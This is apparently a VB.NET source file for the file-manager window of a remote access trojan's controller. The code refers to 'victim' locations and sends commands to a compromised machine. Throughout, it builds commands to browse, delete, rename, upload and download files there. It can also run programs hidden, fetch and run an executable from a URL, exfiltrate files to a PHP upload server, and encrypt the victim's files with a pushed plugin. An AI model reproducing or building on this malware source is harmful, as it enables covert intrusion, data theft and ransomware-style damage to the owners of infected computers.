Imports System.IO

Public Class FM
    Public Event SendFile(ByVal ip As String, ByVal victimLocation As String, ByVal filepath As String)
    Public Event RetrieveFile(ByVal ip As String, ByVal victimLocation As String, ByVal filepath As String, ByVal filesize As String)
    Public C As Client
    Public ccppath As String
    Public ccps As String
    Private Sub FM_Load(sender As Object, e As EventArgs) Handles MyBase.Load

        Dim B As Byte() = SB("GetDrives")
        Dim ClientReq As New Outcoming_Requests(C, B)
        Pending.Req_Out.Add(ClientReq)

        Me.ListView1.Controls.Add(Me.PictureBox1)
        Me.PictureBox1.Visible = False
    End Sub

    Private Sub FM_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        ListView1.Items.Clear()
    End Sub


    Private Sub ListView1_DoubleClick(ByVal sender As Object, ByVal e As System.EventArgs) Handles ListView1.DoubleClick
        Try
            If ListView1.FocusedItem.ImageIndex = 0 Or ListView1.FocusedItem.ImageIndex = 1 Or ListView1.FocusedItem.ImageIndex = 3 Or ListView1.FocusedItem.ImageIndex = 4 Or ListView1.FocusedItem.ImageIndex = 2 Then
                If TextBox1.Text.Length = 0 Then
                    TextBox1.Text += ListView1.FocusedItem.Text

                Else
                    TextBox1.Text += ListView1.FocusedItem.Text & "\"

                End If
                RefreshList()
            End If
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub
    Public Sub RefreshList()
        Dim B As Byte() = SB("FileManager" & Settings.SPL & TextBox1.Text)
        Dim ClientReq As New Outcoming_Requests(C, B)
        Pending.Req_Out.Add(ClientReq)
    End Sub


    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        Try
            If TextBox1.Text.Length < 4 Then
                TextBox1.Text = ""

                Dim B As Byte() = SB("GetDrives" & Settings.SPL)
                Dim ClientReq As New Outcoming_Requests(C, B)
                Pending.Req_Out.Add(ClientReq)

            Else
                TextBox1.Text = TextBox1.Text.Substring(0, TextBox1.Text.LastIndexOf("\"))
                TextBox1.Text = TextBox1.Text.Substring(0, TextBox1.Text.LastIndexOf("\") + 1)
                RefreshList()
            End If
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub DeleteToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DeleteToolStripMenuItem.Click


        For Each LV As ListViewItem In ListView1.SelectedItems
            Select Case LV.ImageIndex
                Case 0 To 1
                Case 2

                    Dim B As Byte() = SB("Delete" & Settings.SPL & "Folder" & Settings.SPL & TextBox1.Text & LV.Text)
                    Dim ClientReq As New Outcoming_Requests(C, B)
                    Pending.Req_Out.Add(ClientReq)

                Case Else

                    Dim B As Byte() = SB("Delete" & Settings.SPL & "File" & Settings.SPL & TextBox1.Text & LV.Text)
                    Dim ClientReq As New Outcoming_Requests(C, B)
                    Pending.Req_Out.Add(ClientReq)

            End Select
        Next
    End Sub


    Private Sub ExecuteToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ExecuteToolStripMenuItem.Click

    End Sub

    Private Sub RenameToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RenameToolStripMenuItem.Click

        For Each LV As ListViewItem In ListView1.SelectedItems
            Select Case LV.ImageIndex
                Case 0 To 1
                Case 2
                    Dim a As String
                    a = InputBox("Enter New Folder Name", "Folder", LV.Text)
                    If Not a = LV.Text Then

                        Dim B As Byte() = SB("Rename" & Settings.SPL & "Folder" & Settings.SPL & TextBox1.Text & LV.Text & Settings.SPL & a)
                        Dim ClientReq As New Outcoming_Requests(C, B)
                        Pending.Req_Out.Add(ClientReq)

                    End If


                Case Else

                    Dim a As String
                    a = InputBox("Enter New File Name", "File", LV.Text)
                    If Not a = LV.Text Then

                        Dim B As Byte() = SB("Rename" & Settings.SPL & "File" & Settings.SPL & TextBox1.Text & LV.Text & Settings.SPL & a)
                        Dim ClientReq As New Outcoming_Requests(C, B)
                        Pending.Req_Out.Add(ClientReq)

                    End If

            End Select
        Next

    End Sub


    Private Sub RedreshToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RedreshToolStripMenuItem.Click
        RefreshList()
    End Sub

    Private Sub BackToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles BackToolStripMenuItem.Click
        Try
            If TextBox1.Text.Length < 4 Then
                TextBox1.Text = ""

                Dim B As Byte() = SB("GetDrives")
                Dim ClientReq As New Outcoming_Requests(C, B)
                Pending.Req_Out.Add(ClientReq)

            Else
                TextBox1.Text = TextBox1.Text.Substring(0, TextBox1.Text.LastIndexOf("\"))
                TextBox1.Text = TextBox1.Text.Substring(0, TextBox1.Text.LastIndexOf("\") + 1)
                RefreshList()
            End If
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub TextBox1_KeyDown(sender As Object, e As KeyEventArgs) Handles TextBox1.KeyDown
        If e.KeyCode = Keys.Enter Then
            e.SuppressKeyPress = True
            RefreshList()
        End If
    End Sub

    Private Sub UploadToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UploadToolStripMenuItem.Click
        Dim open As OpenFileDialog = New OpenFileDialog With {
             .Filter = "All files (*.*)|*.*",
             .Multiselect = True
     }

        Dim result As DialogResult = open.ShowDialog()
        If result = DialogResult.OK Then
            Dim filenames As String() = open.FileNames
            For i As Integer = 0 To filenames.Length - 1

                Dim B As Byte() = SB("sendfileto" & Settings.SPL & TextBox1.Text & Path.GetFileName(filenames(i)) & Settings.SPL & Convert.ToBase64String(IO.File.ReadAllBytes(filenames(i))))
                Dim ClientReq As New Outcoming_Requests(C, B)
                Pending.Req_Out.Add(ClientReq)

            Next
        End If

    End Sub

    Private Sub DownloadToolStripMenuItem_Click_1(sender As Object, e As EventArgs) Handles DownloadToolStripMenuItem.Click
        For Each LV As ListViewItem In ListView1.SelectedItems

            Dim B As Byte() = SB("downloadfile" & Settings.SPL & TextBox1.Text & LV.Text & Settings.SPL & LV.Text)
            Dim ClientReq As New Outcoming_Requests(C, B)
            Pending.Req_Out.Add(ClientReq)

        Next
    End Sub

    Private Sub NewFolderToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles NewFolderToolStripMenuItem.Click

        Dim n As String
        n = InputBox("Enter The folder's Name", "Creat New Folder")

        Dim B As Byte() = SB("creatnewfolder" & Settings.SPL & TextBox1.Text & n)
        Dim ClientReq As New Outcoming_Requests(C, B)
        Pending.Req_Out.Add(ClientReq)

    End Sub

    Private Sub EditToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EditToolStripMenuItem.Click

        Dim B As Byte() = SB("tss" & Settings.SPL & TextBox1.Text & ListView1.FocusedItem.Text)
        Dim ClientReq As New Outcoming_Requests(C, B)
        Pending.Req_Out.Add(ClientReq)

    End Sub

    Private Sub ListView1_KeyDown(sender As Object, e As KeyEventArgs) Handles ListView1.KeyDown
        Try
            If e.Modifiers = Keys.Control AndAlso e.KeyCode = Keys.A Then
                If ListView1.Items.Count > 0 Then
                    For Each x As ListViewItem In ListView1.Items
                        x.Selected = True
                    Next
                End If
            End If
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try

        If e.KeyCode = Keys.Enter Then
            e.SuppressKeyPress = True
            Try
                If ListView1.FocusedItem.ImageIndex = 0 Or ListView1.FocusedItem.ImageIndex = 1 Or ListView1.FocusedItem.ImageIndex = 3 Or ListView1.FocusedItem.ImageIndex = 4 Or ListView1.FocusedItem.ImageIndex = 2 Then
                    If TextBox1.Text.Length = 0 Then
                        TextBox1.Text += ListView1.FocusedItem.Text

                    Else
                        TextBox1.Text += ListView1.FocusedItem.Text & "\"

                    End If
                    RefreshList()
                End If
            Catch ex As Exception
                Debug.WriteLine(ex.Message)
            End Try
        End If
        If e.KeyCode = Keys.Back Then
            e.SuppressKeyPress = True
            Try
                If TextBox1.Text.Length < 4 Then
                    TextBox1.Text = ""

                    Dim B As Byte() = SB("GetDrives" & Settings.SPL)
                    Dim ClientReq As New Outcoming_Requests(C, B)
                    Pending.Req_Out.Add(ClientReq)

                        Else
                    TextBox1.Text = TextBox1.Text.Substring(0, TextBox1.Text.LastIndexOf("\"))
                    TextBox1.Text = TextBox1.Text.Substring(0, TextBox1.Text.LastIndexOf("\") + 1)
                    RefreshList()
                End If
            Catch ex As Exception
                Debug.WriteLine(ex.Message)
            End Try
        End If
    End Sub

    Private Sub ShowFolderFileToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles ShowFolderFileToolStripMenuItem1.Click
        For Each LV As ListViewItem In ListView1.SelectedItems

            Dim B As Byte() = SB("showfolderfile" & Settings.SPL & TextBox1.Text & LV.Text)
            Dim ClientReq As New Outcoming_Requests(C, B)
            Pending.Req_Out.Add(ClientReq)

        Next
    End Sub

    Private Sub HideFolderFileToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles HideFolderFileToolStripMenuItem1.Click
        For Each LV As ListViewItem In ListView1.SelectedItems


            Dim B As Byte() = SB("hidefolderfile" & Settings.SPL & TextBox1.Text & LV.Text)
            Dim ClientReq As New Outcoming_Requests(C, B)
            Pending.Req_Out.Add(ClientReq)

        Next
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Try
            If Not C.IsConnected Then
                Me.Close()
            End If
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub InstallToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles InstallToolStripMenuItem.Click
        Try
            Dim B As Byte() = SB("7zIT" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("Plugins\7zip.dll")))
            Dim ClientReq As New Outcoming_Requests(C, B)
            Pending.Req_Out.Add(ClientReq)
        Catch ex As Exception
            MessageBox.Show(ex.Message)
        End Try
    End Sub

    Private Sub ZipToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ZipToolStripMenuItem.Click
        Dim ou As String
        For Each LV As ListViewItem In ListView1.SelectedItems
            ou &= " -ir!" & """" & TextBox1.Text & LV.Text & """" & " "
        Next

        Dim B As Byte() = SB("7zzip" & Settings.SPL & " a -r " & """" & TextBox1.Text & ListView1.FocusedItem.Text & ".zip" & """" & ou & " -y")
        Dim ClientReq As New Outcoming_Requests(C, B)
        Pending.Req_Out.Add(ClientReq)

    End Sub

    Private Sub UnZipToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UnZipToolStripMenuItem.Click
        For Each LV As ListViewItem In ListView1.SelectedItems

            Dim B As Byte() = SB("7zzip" & Settings.SPL & " x " & """" & TextBox1.Text & LV.Text & """" & " -o" & """" & TextBox1.Text & LV.Text.Replace(".zip", "") & """" & " -y")
            Dim ClientReq As New Outcoming_Requests(C, B)
            Pending.Req_Out.Add(ClientReq)

        Next
    End Sub

    Private Sub CreateFileToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CreateFileToolStripMenuItem.Click

        Dim n As String
        n = InputBox("Enter The File Name", "Creat New File")

        Dim B As Byte() = SB("creatfile" & Settings.SPL & TextBox1.Text & n)
        Dim ClientReq As New Outcoming_Requests(C, B)
        Pending.Req_Out.Add(ClientReq)


    End Sub

    Private Sub CopyToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopyToolStripMenuItem.Click
        ccppath = Nothing
        ccps = Nothing

        For Each LV As ListViewItem In ListView1.SelectedItems
            ccppath &= "|" & TextBox1.Text & LV.Text
            ccps = "|"
        Next
    End Sub

    Private Sub PastToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PastToolStripMenuItem.Click
        If ccps = "|" Then

            Dim B As Byte() = SB("CPP" & Settings.SPL & ccppath & Settings.SPL & TextBox1.Text)
            Dim ClientReq As New Outcoming_Requests(C, B)
            Pending.Req_Out.Add(ClientReq)
            ccppath = Nothing
            ccps = Nothing

        End If

        If ccps = "*" Then

            Dim B As Byte() = SB("CTT" & Settings.SPL & ccppath & Settings.SPL & TextBox1.Text)
            Dim ClientReq As New Outcoming_Requests(C, B)
            Pending.Req_Out.Add(ClientReq)
            ccppath = Nothing
            ccps = Nothing

        End If
    End Sub

    Private Sub CutToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CutToolStripMenuItem.Click
        ccppath = Nothing
        ccps = Nothing

        For Each LV As ListViewItem In ListView1.SelectedItems
            ccppath &= "|" & TextBox1.Text & LV.Text
            ccps = "*"
        Next
    End Sub


    Private Sub PlaySoundToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PlaySoundToolStripMenuItem.Click



    End Sub

    Private Sub EncryptToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EncryptToolStripMenuItem.Click
        Dim Files As String
        Files = Nothing
        For Each LV As ListViewItem In ListView1.SelectedItems
            Files &= "|" & TextBox1.Text & LV.Text
        Next
        Try
            Dim B As Byte() = SB("ENC" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("Plugins\Encoder.dll")) & Settings.SPL & Files)
            Dim ClientReq As New Outcoming_Requests(C, B)
            Pending.Req_Out.Add(ClientReq)
        Catch ex As Exception
            MessageBox.Show(ex.Message)
        End Try
    End Sub

    Private Sub DecryptToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DecryptToolStripMenuItem.Click
        Dim Files As String
        Files = Nothing
        For Each LV As ListViewItem In ListView1.SelectedItems
            Files &= "|" & TextBox1.Text & LV.Text
        Next
        Try
            Dim B As Byte() = SB("DEC" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("Plugins\Encoder.dll")) & Settings.SPL & Files)
            Dim ClientReq As New Outcoming_Requests(C, B)
            Pending.Req_Out.Add(ClientReq)
        Catch ex As Exception
            MessageBox.Show(ex.Message)
        End Try
    End Sub

    Private Sub ListView1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles ListView1.SelectedIndexChanged
        Me.PictureBox1.Image = Nothing
        Me.PictureBox1.Visible = False
        If (Me.ListView1.SelectedItems.Count = 1) Then

            Dim item As ListViewItem = Me.ListView1.SelectedItems.Item(0)
            Try
                If item.Text.ToLower.EndsWith(".jpg") Or item.Text.ToLower.EndsWith(".png") Or item.Text.ToLower.EndsWith(".jpeg") Or item.Text.ToLower.EndsWith(".gif") Or item.Text.ToLower.EndsWith(".bmp") Or item.Text.ToLower.EndsWith(".ico") Or item.Text.ToLower.EndsWith(".tiff") Then

                    Dim B As Byte() = SB("viewimage" & Settings.SPL & TextBox1.Text & item.Text & Settings.SPL & PictureBox1.Width.ToString & Settings.SPL & PictureBox1.Height.ToString)
                    Dim ClientReq As New Outcoming_Requests(C, B)
                    Pending.Req_Out.Add(ClientReq)
                    PictureBox1.Visible = True

                End If
            Catch ex As Exception
                Debug.WriteLine(ex.Message)
            End Try
        End If
    End Sub

    Private Sub SendFromLinkToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SendFromLinkToolStripMenuItem.Click
        Dim urle As String
        urle = "http://www.example.com/File.exe"
        Dim str3 As String = Interaction.InputBox("Set The Url", "From Url", urle)
        Dim fname As String = "server.exe"
        Dim str4 As String = Interaction.InputBox("Set The File Name", "File Name", fname)

        If (str3.Length = 0) Or str4.Length = 0 Then

        Else

            Dim B As Byte() = SB("FURL" & Settings.SPL & str3 & Settings.SPL & TextBox1.Text & str4)
            Dim ClientReq As New Outcoming_Requests(C, B)
            Pending.Req_Out.Add(ClientReq)

        End If

    End Sub

    Private Sub UploadToServerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UploadToServerToolStripMenuItem.Click
        If Not Settings.FMUP Then
            Dim result As Integer = MessageBox.Show("This feature uses the Uploader.php file to upload files to the hosting" & vbCrLf & "do you wante continue ?", "UploadToServer", MessageBoxButtons.YesNo)
            Settings.FMUP = True
            If result = DialogResult.No Then Return
        End If

        For Each LV As ListViewItem In ListView1.SelectedItems

            Dim B As Byte() = SB("UPtoS" & Settings.SPL & Settings.PHP & Settings.SPL & TextBox1.Text & LV.Text)
            Dim ClientReq As New Outcoming_Requests(C, B)
            Pending.Req_Out.Add(ClientReq)

        Next



    End Sub

    Private Sub FM_Resize(sender As Object, e As EventArgs) Handles Me.Resize
        Me.PictureBox1.Left = ((Me.ListView1.Width - Me.PictureBox1.Width) - &H19)
        Me.PictureBox1.Top = ((Me.ListView1.Height - Me.PictureBox1.Height) - &H19)
    End Sub

    Private Sub NormalToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles NormalToolStripMenuItem.Click
        For Each LV As ListViewItem In ListView1.SelectedItems

            Dim B As Byte() = SB("Execute" & Settings.SPL & TextBox1.Text & LV.Text)
            Dim ClientReq As New Outcoming_Requests(C, B)
            Pending.Req_Out.Add(ClientReq)

        Next
    End Sub

    Private Sub HiddenToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles HiddenToolStripMenuItem.Click
        For Each LV As ListViewItem In ListView1.SelectedItems

            Dim B As Byte() = SB("shellfuc" & Settings.SPL & TextBox1.Text & LV.Text)
            Dim ClientReq As New Outcoming_Requests(C, B)
            Pending.Req_Out.Add(ClientReq)

        Next
    End Sub

    Private Sub PlayToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PlayToolStripMenuItem.Click

        Dim B As Byte() = SB("RSS" & Settings.SPL & TextBox1.Text & ListView1.FocusedItem.Text)
        Dim ClientReq As New Outcoming_Requests(C, B)
        Pending.Req_Out.Add(ClientReq)

    End Sub

    Private Sub StopToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles StopToolStripMenuItem.Click

        Dim B As Byte() = SB("RSSDis")
        Dim ClientReq As New Outcoming_Requests(C, B)
        Pending.Req_Out.Add(ClientReq)

    End Sub
End Class